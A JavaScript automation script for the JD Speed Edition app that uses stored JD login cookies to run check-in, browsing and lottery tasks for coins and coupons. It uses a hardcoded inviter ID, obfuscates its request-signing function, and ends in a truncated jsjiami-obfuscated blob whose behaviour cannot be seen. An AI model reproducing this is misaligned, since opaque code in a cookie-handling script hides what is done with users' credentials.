/*
京东极速版签到+赚现金任务
每日9毛左右，满3，10，50可兑换无门槛红包
⚠️⚠️⚠️一个号需要运行40分钟左右

活动时间：长期
活动入口：京东极速版app-现金签到
原脚本作者：lxk0301
*/
const $ = new Env('京东极速版');
const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let cookiesArr = [], cookie = '', message;
let helpAuthor = true;
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {
  };
} else {
  cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
}
const JD_API_HOST = 'https://api.m.jd.com/', actCode = 'visa-card-001';


!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      message = '';
      await TotalBean();
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      await jdGlobal()
      await $.wait(2*1000)
    }
  }
})()
  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })

async function jdGlobal() {
  try {
    await richManIndex()

    await wheelsHome()
    await apTaskList()
    await wheelsHome()
    await signInit()
    await sign()
    $.score = 0
    $.total = 0
    await taskList()
    await queryJoy()
    await signInit()
    await cash()
    await showMsg()
  } catch (e) {
    $.logErr(e)
  }
}


function showMsg() {
  return new Promise(resolve => {
    message += `本次运行获得${$.score}金币，共计${$.total}金币`
    $.msg($.name, '', `京东账号${$.index}${$.nickName}\n${message}`);
    resolve()
  })
}

async function signInit() {
  return new Promise(resolve => {
    $.get(taskUrl('speedSignInit', {
      "activityId": "8a8fabf3cccb417f8e691b6774938bc2",
      "kernelPlatform": "RN",
      "inviterId":"DNfaRn46j3w7TR4On8bJjlhOf"
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            //console.log(data)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function sign() {
  return new Promise(resolve => {
    $.get(taskUrl('speedSign', {
        "kernelPlatform": "RN",
        "activityId": "8a8fabf3cccb417f8e691b6774938bc2",
        "noWaitPrize": "false"
      }),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if (data.subCode === 0) {
                console.log(`签到获得${data.data.signAmount}现金，共计获得${data.data.cashDrawAmount}`)
              } else {
                console.log(`签到失败，${data.msg}`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

async function taskList() {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
        "version": "3.1.0",
        "method": "newTaskCenterPage",
        "data": {"channel": 1}
      }),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              for (let task of data.data) {
                $.taskName = task.taskInfo.mainTitle
                if (task.taskInfo.status === 0) {
                  if (task.taskType >= 1000) {
                    await doTask(task.taskType)
                    await $.wait(1000)
                  } else {
                    $.canStartNewItem = true
                    while ($.canStartNewItem) {
                      if (task.taskType !== 3) {
                        await queryItem(task.taskType)
                      } else {
                        await startItem("", task.taskType)
                      }
                    }
                  }
                } else {
                  console.log(`${task.taskInfo.mainTitle}已完成`)
                }
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

async function doTask(taskId) {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
      "method": "marketTaskRewardPayment",
      "data": {"channel": 1, "clientTime": +new Date() + 0.588, "activeType": taskId}
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0) {
              console.log(`${data.data.taskInfo.mainTitle}任务完成成功，预计获得${data.data.reward}金币`)
            } else {
              console.log(`任务完成失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function queryJoy() {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {"method": "queryJoyPage", "data": {"channel": 1}}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if (data.data.taskBubbles)
                for (let task of data.data.taskBubbles) {
                  await rewardTask(task.id, task.activeType)
                  await $.wait(500)
                }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

async function rewardTask(id, taskId) {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
      "method": "joyTaskReward",
      "data": {"id": id, "channel": 1, "clientTime": +new Date() + 0.588, "activeType": taskId}
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0) {
              $.score += data.data.reward
              console.log(`气泡收取成功，获得${data.data.reward}金币`)
            } else {
              console.log(`气泡收取失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}


async function queryItem(activeType = 1) {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
      "method": "queryNextTask",
      "data": {"channel": 1, "activeType": activeType}
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0 && data.data) {
              await startItem(data.data.nextResource, activeType)
            } else {
              console.log(`商品任务开启失败，${data.message}`)
              $.canStartNewItem = false
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function startItem(activeId, activeType) {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute', {
      "method": "enterAndLeave",
      "data": {
        "activeId": activeId,
        "clientTime": +new Date(),
        "channel": "1",
        "messageType": "1",
        "activeType": activeType,
      }
    }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0 && data.data) {
              if (data.data.taskInfo.isTaskLimit === 0) {
                let {videoBrowsing, taskCompletionProgress, taskCompletionLimit} = data.data.taskInfo
                if (activeType !== 3)
                  videoBrowsing = activeType === 1 ? 5 : 10
                console.log(`【${taskCompletionProgress + 1}/${taskCompletionLimit}】浏览商品任务记录成功，等待${videoBrowsing}秒`)
                await $.wait(videoBrowsing * 1000)
                await endItem(data.data.uuid, activeType, activeId, activeType === 3 ? videoBrowsing : "")
              } else {
                console.log(`${$.taskName}任务已达上限`)
                $.canStartNewItem = false
              }
            } else {
              $.canStartNewItem = false
              console.log(`${$.taskName}任务开启失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function endItem(uuid, activeType, activeId = "", videoTimeLength = "") {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute',
      {
        "method": "enterAndLeave",
        "data": {
          "channel": "1",
          "clientTime": +new Date(),
          "uuid": uuid,
          "videoTimeLength": videoTimeLength,
          "messageType": "2",
          "activeType": activeType,
          "activeId": activeId
        }
      }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0 && data.isSuccess) {
              await rewardItem(uuid, activeType, activeId, videoTimeLength)
            } else {
              console.log(`${$.taskName}任务结束失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function rewardItem(uuid, activeType, activeId = "", videoTimeLength = "") {
  return new Promise(resolve => {
    $.get(taskUrl('ClientHandleService.execute',
      {
        "method": "rewardPayment",
        "data": {
          "channel": "1",
          "clientTime": +new Date(),
          "uuid": uuid,
          "videoTimeLength": videoTimeLength,
          "messageType": "2",
          "activeType": activeType,
          "activeId": activeId
        }
      }), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0 && data.isSuccess) {
              $.score += data.data.reward
              console.log(`${$.taskName}任务完成，获得${data.data.reward}金币`)
            } else {
              console.log(`${$.taskName}任务失败，${data.message}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

async function cash() {
  return new Promise(resolve => {
    $.get(taskUrl('MyAssetsService.execute',
      {"method": "userCashRecord", "data": {"channel": 1, "pageNum": 1, "pageSize": 20}}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              $.total = data.data.goldBalance
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}

// 大转盘
function wheelsHome() {
  return new Promise(resolve => {
    $.get(taskGetUrl('wheelsHome',
      {"linkId":"toxw9c5sy9xllGBr3QFdYg"}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if(data.code ===0){
                console.log(`【幸运大转盘】剩余抽奖机会：${data.data.lotteryChances}`)
                while(data.data.lotteryChances--) {
                  await wheelsLottery()
                  await $.wait(500)
                }
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}
// 大转盘
function wheelsLottery() {
  return new Promise(resolve => {
    $.get(taskGetUrl('wheelsLottery',
      {"linkId":"toxw9c5sy9xllGBr3QFdYg"}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if(data.data && data.data.rewardType){
                console.log(`幸运大转盘抽奖获得：【${data.data.couponUsedValue}-${data.data.rewardValue}${data.data.couponDesc}】\n`)
                message += `幸运大转盘抽奖获得：【${data.data.couponUsedValue}-${data.data.rewardValue}${data.data.couponDesc}】\n`
              }else{
                console.log(`幸运大转盘抽奖获得：空气`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}
// 大转盘任务
function apTaskList() {
  return new Promise(resolve => {
    $.get(taskGetUrl('apTaskList',
      {"linkId":"toxw9c5sy9xllGBr3QFdYg"}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if(data.code ===0){
                for(let task of data.data){
                  // {"linkId":"toxw9c5sy9xllGBr3QFdYg","taskType":"SIGN","taskId":67,"channel":4}
                  if(!task.taskFinished && ['SIGN','BROWSE_CHANNEL'].includes(task.taskType)){
                    console.log(`去做任务${task.taskTitle}`)
                    await apDoTask(task.taskType,task.id,4,task.taskSourceUrl)
                  }
                }
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}
// 大转盘做任务
function apDoTask(taskType,taskId,channel,itemId) {
  // console.log({"linkId":"toxw9c5sy9xllGBr3QFdYg","taskType":taskType,"taskId":taskId,"channel":channel,"itemId":itemId})
  return new Promise(resolve => {
    $.get(taskGetUrl('apDoTask',
      {"linkId":"toxw9c5sy9xllGBr3QFdYg","taskType":taskType,"taskId":taskId,"channel":channel,"itemId":itemId}),
      async (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if(data.code ===0 && data.data && data.data.finished){
                console.log(`任务完成成功`)
              }else{
                console.log(JSON.stringify(data))
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve(data);
        }
      })
  })
}
// 红包大富翁
function richManIndex() {
  return new Promise(resolve => {
    $.get(taskUrl('richManIndex', {"actId":"hbdfw","needGoldToast":"true"}), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if(data.code ===0 && data.data && data.data.userInfo){
              console.log(`用户当前位置：${data.data.userInfo.position}，剩余机会：${data.data.userInfo.randomTimes}`)
              while(data.data.userInfo.randomTimes--){
                await shootRichManDice()
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
// 红包大富翁
function shootRichManDice() {
  return new Promise(resolve => {
    $.get(taskUrl('shootRichManDice', {"actId":"hbdfw"}), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if(data.code ===0 && data.data && data.data.rewardType && data.data.couponDesc){
              message += `红包大富翁抽奖获得：【${data.data.couponUsedValue}-${data.data.rewardValue} ${data.data.poolName}】\n`
              console.log(`红包大富翁抽奖获得：【${data.data.couponUsedValue}-${data.data.rewardValue} ${data.data.poolName}】`)
            }else{
              console.log(`红包大富翁抽奖：获得空气`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxb24bc=["\x6C\x69\x74\x65\x2D\x61\x6E\x64\x72\x6F\x69\x64\x26","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x26\x61\x6E\x64\x72\x6F\x69\x64\x26\x33\x2E\x31\x2E\x30\x26","\x26","\x26\x38\x34\x36\x63\x34\x63\x33\x32\x64\x61\x65\x39\x31\x30\x65\x66","\x31\x32\x61\x65\x61\x36\x35\x38\x66\x37\x36\x65\x34\x35\x33\x66\x61\x66\x38\x30\x33\x64\x31\x35\x63\x34\x30\x61\x37\x32\x65\x30","\x69\x73\x4E\x6F\x64\x65","\x63\x72\x79\x70\x74\x6F\x2D\x6A\x73","","\x61\x70\x69\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x62\x6F\x64\x79\x3D","\x26\x61\x70\x70\x69\x64\x3D\x6C\x69\x74\x65\x2D\x61\x6E\x64\x72\x6F\x69\x64\x26\x63\x6C\x69\x65\x6E\x74\x3D\x61\x6E\x64\x72\x6F\x69\x64\x26\x75\x75\x69\x64\x3D\x38\x34\x36\x63\x34\x63\x33\x32\x64\x61\x65\x39\x31\x30\x65\x66\x26\x63\x6C\x69\x65\x6E\x74\x56\x65\x72\x73\x69\x6F\x6E\x3D\x33\x2E\x31\x2E\x30\x26\x74\x3D","\x26\x73\x69\x67\x6E\x3D","\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x2A\x2F\x2A","\x52\x4E","\x4A\x44\x4D\x6F\x62\x69\x6C\x65\x4C\x69\x74\x65\x2F\x33\x2E\x31\x2E\x30\x20\x28\x69\x50\x61\x64\x3B\x20\x69\x4F\x53\x20\x31\x34\x2E\x34\x3B\x20\x53\x63\x61\x6C\x65\x2F\x32\x2E\x30\x30\x29","\x7A\x68\x2D\x48\x61\x6E\x73\x2D\x43\x4E\x3B\x71\x3D\x31\x2C\x20\x6A\x61\x2D\x43\x4E\x3B\x71\x3D\x30\x2E\x39","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function taskUrl(_0x7683x2,_0x7683x3= {}){let _0x7683x4=+ new Date();let _0x7683x5=`${__Oxb24bc[0x0]}${JSON[__Oxb24bc[0x1]](_0x7683x3)}${__Oxb24bc[0x2]}${_0x7683x2}${__Oxb24bc[0x3]}${_0x7683x4}${__Oxb24bc[0x4]}`;let _0x7683x6=__Oxb24bc[0x5];const _0x7683x7=$[__Oxb24bc[0x6]]()?require(__Oxb24bc[0x7]):CryptoJS;let _0x7683x8=_0x7683x7.HmacSHA256(_0x7683x5,_0x7683x6).toString();return {url:`${__Oxb24bc[0x8]}${JD_API_HOST}${__Oxb24bc[0x9]}${_0x7683x2}${__Oxb24bc[0xa]}${escape(JSON[__Oxb24bc[0x1]](_0x7683x3))}${__Oxb24bc[0xb]}${_0x7683x4}${__Oxb24bc[0xc]}${_0x7683x8}${__Oxb24bc[0x8]}`,headers:{'\x48\x6F\x73\x74':__Oxb24bc[0xd],'\x61\x63\x63\x65\x70\x74':__Oxb24bc[0xe],'\x6B\x65\x72\x6E\x65\x6C\x70\x6C\x61\x74\x66\x6F\x72\x6D':__Oxb24bc[0xf],'\x75\x73\x65\x72\x2D\x61\x67\x65\x6E\x74':__Oxb24bc[0x10],'\x61\x63\x63\x65\x70\x74\x2D\x6C\x61\x6E\x67\x75\x61\x67\x65':__Oxb24bc[0x11],'\x43\x6F\x6F\x6B\x69\x65':cookie}}}(function(_0x7683x9,_0x7683xa,_0x7683xb,_0x7683xc,_0x7683xd,_0x7683xe){_0x7683xe= __Oxb24bc[0x12];_0x7683xc= function(_0x7683xf){if( typeof alert!== _0x7683xe){alert(_0x7683xf)};if( typeof console!== _0x7683xe){console[__Oxb24bc[0x13]](_0x7683xf)}};_0x7683xb= function(_0x7683x7,_0x7683x9){return _0x7683x7+ _0x7683x9};_0x7683xd= _0x7683xb(__Oxb24bc[0x14],_0x7683xb(_0x7683xb(__Oxb24bc[0x15],__Oxb24bc[0x16]),__Oxb24bc[0x17]));try{_0x7683x9= __encode;if(!( typeof _0x7683x9!== _0x7683xe&& _0x7683x9=== _0x7683xb(__Oxb24bc[0x18],__Oxb24bc[0x19]))){_0x7683xc(_0x7683xd)}}catch(e){_0x7683xc(_0x7683xd)}})({})

function taskGetUrl(function_id, body) {
  return {
    url: `https://api.m.jd.com/?appid=activities_platform&functionId=${function_id}&body=${escape(JSON.stringify(body))}&t=${+new Date()}`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      'user-agent': $.isNode() ? (process.env.JS_USER_AGENT ? process.env.JS_USER_AGENT : (require('./JS_USER_AGENTS').USER_AGENT)) : ($.getdata('JSUA') ? $.getdata('JSUA') : "'jdltapp;iPad;3.1.0;14.4;network/wifi;Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      'Accept-Language': 'zh-Hans-CN;q=1,en-CN;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Content-Type': "application/x-www-form-urlencoded",
      "referer": "https://an.jd.com/babelDiy/Zeus/q1eB6WUB8oC4eH1BsCLWvQakVsX/index.html"
    }
  }
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            $.nickName = data['base'].nickname;
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}

function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
var _0xodB='jsjiami.com.v6',_0x51ef=[_0xodB,'wr1aw5LCrzjCqQ==','EcOdZ8OTw6M=','w7s6DUY6Qis=','dmtGN3o=','wqdZS8KWw4gS','ecKlcEwY','DQRuwrc=','F3vDiVDDpw==','GMO3OMOXBCHCtw==','w4vCl17Doko=','wrxdTMKF','w7x2RsK1Xg==','RVHDnEtDaxETw6vDj18v','wp3DgjhWwpkww7vClic1w5/Cr1HCvsKVSMOww7XDt3MzX0o5w5DCnMOywqVpCg5twpc=','w5paf8OTwqxYwoxyUsKmRTHCnMO1w7PCu8KZZ8Ozw7HDqMOBw5jCgyLDvCkaw6nCssOrHcKq','QsKhYVkPDAHDs8OdNBZxw4/DqsKrRkPCmsOJwoLCq3rDpsKGwpACfUU=','w4nCihHDosOA','w4oWw4XCo8Ksw5LCoMOtOcKKZmrCoMKJwqjCiQ==','TnrDgAk=','c2vDu8KyHMOHWG5fwowWBGvCm8OXw4zCjlnCm1nDnsK9P8OuLH/DtTjDp8KWw67ChcOKwrrDgCPCvsOfLyDCj8K6wrB2a1wYRsK+dHLCiX7DucKcw5TDqsOpwrtxw7I7CsKiB8KNOSE+fcKHwo9Tw57DmcKOw5DCpkkiO8Ktw40Hwrk7w4XDj8OoNyRHJEHDi0DCiWXDkTfCt8OpFgXChsKFw6MNw7pTZnA7JDRxwrPCgzQvZ0TCpwDDqSTDrsKSw7bDh8K2wrLCr8KWwpYUw5DCtyRFw5FWSwl6ZBYjIDzCs8KXaMOx','C8OETDjDhBBFJFPDvcKIw6YhVMOfH8K5w49xUcOjw4s3w7TDnMOKwpgzwq8=','wpApLcKawr7DkMOxQWk=','w7cvDVcOHXDDpn3CqTAfS0nCrQ3DjTHDpRtwwrTDvm8=','IsO3f8OBw4c=','eMK3UnMI','N27DvGHDqA==','w5gMw4trAg==','EjBLwrvCjQ==','w7HClHXDqEpY','Om5T','FVN6D8Kew6/DscOMQsOaZ8O3w5c=','UMKONA==','w5UIJnIuYg3Cll3Cnhx/cg==','w7vDhcOqN8KT','wrTDpw1Uwqk=','w6bCsXnDk8OxfjBPccOF','w7khw5NMJm9o','wpfDuwZ9woY=','TcKwYU0dQk8=','HMKyw4jDjsOS','w5vDgMOsJsKn','w5dpU8KXbg==','UcKXwoFJwo0RwoEQw4Ytw78Aw5tYwohxw7/DrMO7wojDum7CoMO+wpcow63CpsK8woPDncOfWsOJwobCmDllwr48EhYtMcKewpfDknYmaRrCuGZAT8OEKz7Cpl8Tf8OCXMOhZGvCmcKiw7jCum3DuRrDni3Cr8KIMMOiwokNKnIiw5fCh1fDs8KoQ8KlfVg=','WEklwqDClsOafQjCocKow7gUw6JRUi/CvXpUW8KOA8OvwrvCjBI0w4rCuAXDmcKGbMKrT2MVw6oMwpRNw5bCkCAFw6F7w51EwoJ3w41zwqlZNC3DmMOYVMKgHmM0S8KYScOQw7XDrcKPw7nDrcKMGVlKwoA3w4EoGMO0dyPDlcKUwpfCncOVN8OSw5YQw7vDjm5IMsOSZD8ERxBJw4BlC8Oqw55RwoM+cWfCjsOQw59EKl4mwq14w7sIF8KXCcKvw4TDtjAMLiF1QcOMw4EGGDl2wr4semJFw5vDmsKBwpVqex/DiANHwo0BbnbCsW5EwqJ/w459KsOtRC3DrRF5I8Kjwop9wrshP8ONKsOxw5HDmyDDgcK2VhYwaMK1woB6w41dw5B5LFHDrcOHcFIkw45Lw7wVw64QUjLDmsKDGcKlA8OSwrMsw4s1wqVmeFnCtXnDsT3CqQzDscOCwoBfw5ZaNRRTJ8O9wq0THC3Ci0DDnDt/wqzDuMK/w47Cny3DoCc=','w64rw5Rc','YQx+Y8KUJXvCscOcwoPDhsKS','PnBVNsKkw4nDgsOnasOyTMKWw7vDucOrVcObHsK5G1vChMOlesKuT1DCpMOjLsKKZFs=','woLDtMOjZGUSw7XDkGESw5VdZQ7DrE3Di1rCncOUw70Fw5YJwoA=','w6lSO8KEWQ==','XybDomLDv0Eec8KwB2LDgcKteEJ3','fcKxwrpr','wozDgsOhC8KlwplvwoRiYMKFwpo5GEJ9VHvClsKOb1oINkrCt8K4ISIOdcKgwr5heMOJw7bCsnxLwqPDlzpdbMO7CSNXwqfDr8KEw6zCqEt7wqU0Vm1qw4TCgsOhXCTDoijCv8Oswo7CkkTDvcKFw7sTbiIKdSp1R2XCkcKwG2FpNsKtTAnCisOhwpjDmBjDr8OzwrvDji0mw5rCvMKuBsOIwosqWBrCo0suw5UdwoV6Yz/Cv8K5a3LDo8KKR8OHw6cIw5s7w7PDq8KUQMOEw69wJV5HRcKQLMKlSmHDnUPCrQ==','KcOVYsO9w4MIR3PDlA==','TFXDgRVdf1RYwqTDnFlswp1tFUjCisONNnHDlSkfwrk=','XAbCjQd8','EcOEVgzDjQ==','woPDhcK8QCo=','w6jCtV7Dt0c=','wpwyDsK0wp0=','w4LDm8OLCMK1wp0=','YUfDow==','w7F5UMOqwpZ+wr9ZesKOblDCsA==','wq5SUw==','QQXClTVEw63Dt3BcwofDjMKEPA==','wrPDssONRlQ=','w45Mw7LDosOU','wodsHm7CusOEJVUEwoY=','w7zDkmcpD8Kyew==','wp1Yw6/CiwM=','w7/CpcKewpV/w5Ue','RzHCmSNY','w5LDnksVCw==','w41dw6zCgRTCu1MBw6ZcwrPDoz0AAcO8E8KADgTCk03Dr3gjMDLCtMOewp9pe8OSw5J8w7rCnQ==','w73Dgn0uGsKvdcKULG0dw7LCtsO3WcOmOcO4N8OhAsOFaVUuw44/F8OyIcK0w6nDvTIXwq8kw4fDn8OxB2LChVvDqVNEwr5VVXhGwrnDtcOKwo4pw5scXD0cw4TDgsKIwpDDpMKHw6nDnjUocBk9ESbCo8O+w41Awp02w4vDpsKgwophQB0VwopoeEvClER+TMOcw6EpGAbDvX/CicO5FVnCnETCqGw=','w4YpI3U/','Bg3ClxFXNR5Vw7/CnU0/w5YiD1zDjcOKZHHCm2QAw6HDiMOiwqdPHcK6Lw9pw7HCpD7CusKMwrLDqMOjw4F5','w7JEw7nDoA==','w7Yww5NYNCEmSsKkBifDi8OMw7bDvh3DocKhwpPDnhrDuW1pw4s4w5YSN8K8aAkPwpjCtmxzQsKGw5bCtMO8wp5XK8OuVMOcUMOywrJQSmvChWFpMsOPwobDj8K8wq9twoLCiMK7wrdKwqI=','PGbDkljDjHgsGc